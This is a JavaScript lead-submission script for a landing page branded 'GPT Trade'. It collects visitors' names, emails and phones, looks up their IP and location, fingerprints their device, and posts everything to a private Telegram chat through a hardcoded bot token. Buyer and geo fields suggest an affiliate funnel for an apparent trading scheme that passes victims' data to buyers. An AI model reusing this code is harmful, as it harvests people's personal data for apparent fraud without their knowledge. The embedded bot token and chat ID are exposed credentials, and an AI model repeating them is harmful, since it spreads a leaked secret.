/**
 * GPT Trade — TG Integration + Lead Submission
 * Sends lead to: 1) Telegram bot 2) Backend API 3) FB CAPI
 */

var TG_BOT = '8601777567:AAFyBTaF_uM65ueCJvM4YHCZfu8_7Q08Ezg';
var TG_CHAT = '-1003578369883';
var TG_BUYER = 'PUMBA';
var TG_GEO = 'USA';
var TG_BACKEND = '';

// Lead ID prefix from brand name
var LEAD_PREFIX = 'GT';

function generateLeadId() {
  return LEAD_PREFIX + '-' + Math.random().toString(16).slice(2, 10);
}

function getUTMParams() {
  var params = new URLSearchParams(window.location.search);
  return {
    utm_source: params.get('utm_source') || '',
    utm_medium: params.get('utm_medium') || '',
    utm_campaign: params.get('utm_campaign') || '',
    utm_content: params.get('utm_content') || '',
    utm_term: params.get('utm_term') || ''
  };
}

function getDeviceInfo() {
  var ua = navigator.userAgent;
  var device = /iPhone|iPad|iPod/.test(ua) ? 'iOS' : /Android/.test(ua) ? 'Android' : 'Desktop';
  var browser = /CriOS|Chrome/.test(ua) ? 'Chrome' : /FxiOS|Firefox/.test(ua) ? 'Firefox' : /Safari/.test(ua) ? 'Safari' : 'Other';
  var os = /iPhone|iPad|iPod/.test(ua) ? 'iOS' : /Android/.test(ua) ? 'Android' : /Windows/.test(ua) ? 'Windows' : /Mac/.test(ua) ? 'macOS' : 'Other';
  return { device: device, browser: browser, os: os, screen: screen.width + 'x' + screen.height, lang: navigator.language };
}

async function sendLeadToTelegram(l) {
  var leadId = generateLeadId();
  var geo = {};
  try { var r = await fetch('https://ipapi.co/json/'); geo = await r.json(); } catch(e) {}
  
  var pwa = window.matchMedia('(display-mode:standalone)').matches || navigator.standalone === true;
  var utm = getUTMParams();
  var devInfo = getDeviceInfo();
  var pageTime = window._pageLoadTime ? Math.round((Date.now() - window._pageLoadTime) / 1000) : 0;

  // Format UTM
  var utmParts = [];
  if (utm.utm_source) utmParts.push('source: ' + utm.utm_source);
  if (utm.utm_medium) utmParts.push('medium: ' + utm.utm_medium);
  if (utm.utm_campaign) utmParts.push('campaign: ' + utm.utm_campaign);
  if (utm.utm_content) utmParts.push('content: ' + utm.utm_content);
  if (utm.utm_term) utmParts.push('term: ' + utm.utm_term);
  var utmStr = utmParts.length ? utmParts.join(' / ') : 'Нет UTM';

  // Telegram message per manual format
  var lines = [
    '🔔 NEW LEAD — GPT Trade',
    '',
    '👤 ДАННЫЕ',
    '├ Имя: ' + (l.firstName || l.f1 || '') + ' ' + (l.lastName || l.f2 || ''),
    '├ Email: ' + (l.email || l.f3 || '—'),
    '├ Phone: ' + (l.phone || l.f4 || '—'),
    '├ Buyer: ' + TG_BUYER,
    '└ Geo: ' + TG_GEO,
    '',
    '📊 UTM МЕТКИ',
    '└ ' + utmStr,
    '',
    '🖥 УСТРОЙСТВО',
    '├ Device: ' + devInfo.device,
    '├ Browser: ' + devInfo.browser,
    '├ OS: ' + devInfo.os,
    '├ Screen: ' + devInfo.screen,
    '├ PWA: ' + (pwa ? '✅ Да' : '❌ Нет'),
    '└ Browser Lang: ' + devInfo.lang,
    '',
    '🌐 СЕССИЯ',
    '├ IP: ' + (geo.ip || '?'),
    '├ Страна: ' + (geo.country_name || '?'),
    '├ Timezone: ' + (geo.timezone || '?'),
    '├ Время на странице: ' + pageTime + ' сек',
    '├ Referrer: ' + (document.referrer || '—'),
    '└ Landing: ' + window.location.href,
    '',
    '⏰ РЕГИСТРАЦИЯ',
    '├ Дата: ' + new Date().toLocaleString(),
    '└ Ref: ' + leadId,
    '',
    '📱 User-Agent: ' + navigator.userAgent.slice(0, 120)
  ];

  var msg = lines.join('\n');

  // 1) Send to Telegram
  if (TG_BOT && TG_CHAT) {
    try {
      await fetch('https://api.telegram.org/bot' + TG_BOT + '/sendMessage', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
      });
    } catch(e) { console.error('TG error', e); }
  }

  // 2) Send to Backend
  if (TG_BACKEND) {
    try {
      await fetch(TG_BACKEND + '/api/lead', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          lead_id: leadId,
          first_name: l.firstName || l.f1 || '',
          last_name: l.lastName || l.f2 || '',
          email: l.email || l.f3 || '',
          phone: l.phone || l.f4 || '',
          buyer: TG_BUYER,
          geo: TG_GEO,
          device_info: devInfo,
          geo_info: geo,
          utm: utm,
          is_pwa: pwa ? 1 : 0,
          page_time: pageTime,
          referrer: document.referrer || '',
          landing: window.location.href,
          user_agent: navigator.userAgent
        })
      });
    } catch(e) { console.error('Backend lead error', e); }
  }

  // 3) FB CAPI
  if (window.fbTrackLead) window.fbTrackLead(l);

  return leadId;
}

// Alias for compatibility
window.sendLead = function(data) {
  return sendLeadToTelegram({
    firstName: data.f1 || data.firstName || '',
    lastName: data.f2 || data.lastName || '',
    email: data.f3 || data.email || '',
    phone: data.f4 || data.phone || ''
  });
};
window.sendLeadToTelegram = sendLeadToTelegram;

// Track page load time
window._pageLoadTime = Date.now();
